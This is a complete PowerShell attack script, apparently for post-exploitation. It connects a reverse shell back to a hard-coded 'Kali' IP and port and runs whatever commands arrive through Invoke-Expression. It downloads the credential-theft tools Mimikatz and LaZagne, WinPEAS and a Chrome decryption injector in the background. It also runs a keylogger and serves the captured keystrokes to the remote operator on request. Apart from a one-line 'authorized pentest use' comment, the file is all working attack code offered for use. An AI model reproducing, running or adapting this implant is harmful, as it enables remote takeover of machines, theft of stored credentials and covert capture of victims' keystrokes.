# PowerShell reverse shell with tool staging + simple keylogger
# Stages: Mimikatz, LaZagne, WinPEAS | Keylog -> C:\Lab\keylog.txt
# (authorized pentest use)

$KaliIP = "192.168.100.109"
$Port = 4444

# ---------- Config ----------
$ToolDir = "C:\Lab"
$KeylogFile = "C:\Lab\keylog.txt"
$Tools = @{
    "winPEASx64.exe" = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
    "LaZagne.exe"    = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
    "mimikatz.zip"   = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
    "chrome-injector-v0.20.0.zip"  = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip"
}

# ---------- Tool staging ----------
$downloadScriptBlock = {
    param($ToolDir, $Tools)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    if (-not (Test-Path $ToolDir)) {
        New-Item -ItemType Directory -Path $ToolDir -Force | Out-Null
    }

    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

    foreach ($tool in $Tools.GetEnumerator()) {
        $dest = Join-Path $ToolDir $tool.Key
        if (Test-Path $dest) { continue }
        try {
            $wc.DownloadFile($tool.Value, $dest)

            if ($tool.Key -eq "mimikatz.zip") {
                $mkDir = Join-Path $ToolDir "mimikatz"
                if (-not (Test-Path $mkDir)) { New-Item -ItemType Directory -Path $mkDir -Force | Out-Null }
                try {
                    Expand-Archive -Path $dest -DestinationPath $mkDir -Force
                } catch {
                    $shell = New-Object -ComObject Shell.Application
                    $zip = $shell.NameSpace($dest)
                    $out = $shell.NameSpace($mkDir)
                    $out.CopyHere($zip.Items(), 0x14)
                }
            }
        } catch { }
    }
    $wc.Dispose()
}

# ---------- Simple keylogger (Securethelogs style, ToUnicode-based) ----------
$keylogScriptBlock = {
    param($KeylogFile)

    # Create log file if missing
    if ((Test-Path $KeylogFile) -eq $false) { New-Item $KeylogFile -ItemType File -Force | Out-Null }

    # Compile API once; don't die if already loaded (keyoff/keyon in same process)
    if (-not ("API.Win32" -as [type])) {
        $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
        $null = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    }

    $API = [API.Win32]

    try {
        while ((Test-Path $KeylogFile) -ne $false) {

            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {

                $state = $API::GetAsyncKeyState($ascii)

                if ($state -eq -32767) {

                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $null = $API::GetKeyboardState($kbstate)

                    $mychar = New-Object -TypeName System.Text.StringBuilder
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success -and (Test-Path $KeylogFile) -eq $true) {
                        # AppendAllText writes immediately - no buffering, check the file anytime
                        [System.IO.File]::AppendAllText($KeylogFile, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally { exit }
}

function Start-ToolStaging {
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $ps = [powershell]::Create()
    $ps.Runspace = $runspace
    [void]$ps.AddScript($downloadScriptBlock.ToString()).AddArgument($ToolDir).AddArgument($Tools)
    [void]$ps.BeginInvoke()
}

$script:KeylogPS = $null
$script:KeylogRunspace = $null

function Start-Keylogger {
    if ($script:KeylogPS) { return "Keylogger already running." }
    $script:KeylogRunspace = [runspacefactory]::CreateRunspace()
    $script:KeylogRunspace.Open()
    $script:KeylogPS = [powershell]::Create()
    $script:KeylogPS.Runspace = $script:KeylogRunspace
    [void]$script:KeylogPS.AddScript($keylogScriptBlock.ToString()).AddArgument($KeylogFile)
    [void]$script:KeylogPS.BeginInvoke()
    return "Keylogger started -> $KeylogFile"
}

function Stop-Keylogger {
    if (-not $script:KeylogPS) { return "Keylogger not running." }
    $script:KeylogPS.Stop()
    $script:KeylogRunspace.Close()
    $script:KeylogPS = $null
    $script:KeylogRunspace = $null
    return "Keylogger stopped. Log: $KeylogFile"
}

# ---------- Reverse shell ----------
try {
    $client = New-Object System.Net.Sockets.TCPClient($KaliIP, $Port)
} catch {
    exit
}

$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

Start-ToolStaging
Start-Keylogger | Out-Null

$writer.WriteLine(@"
Connected: $env:COMPUTERNAME\$env:USERNAME
Tool staging -> $ToolDir
Keylogger ACTIVE -> $KeylogFile (writes instantly, no buffering)
Commands: 'tools' | 'keys' | 'keyon' | 'keyoff' | 'exit'
"@)

while ($client.Connected) {
    $writer.Write("PS " + (Get-Location).Path + "> ")

    $command = $reader.ReadLine()

    if ($null -eq $command) { break }
    if ($command -eq "exit") { break }

    if ($command -eq "tools") {
        if (Test-Path $ToolDir) {
            $writer.WriteLine((Get-ChildItem $ToolDir | Select-Object Name, Length | Out-String))
        } else {
            $writer.WriteLine("Tool directory not created yet.")
        }
        continue
    }

    if ($command -eq "keys") {
        if (Test-Path $KeylogFile) {
            $writer.WriteLine((Get-Content $KeylogFile -Raw | Out-String))
        } else {
            $writer.WriteLine("No keylog file yet.")
        }
        continue
    }

    if ($command -eq "keyoff") {
        $writer.WriteLine((Stop-Keylogger))
        continue
    }

    if ($command -eq "keyon") {
        $writer.WriteLine((Start-Keylogger))
        continue
    }

    try {
        $output = Invoke-Expression $command 2>&1 | Out-String
    } catch {
        $output = $_ | Out-String
    }

    $writer.WriteLine($output)
}

Stop-Keylogger | Out-Null
$reader.Close()
$writer.Close()
$stream.Close()
$client.Close()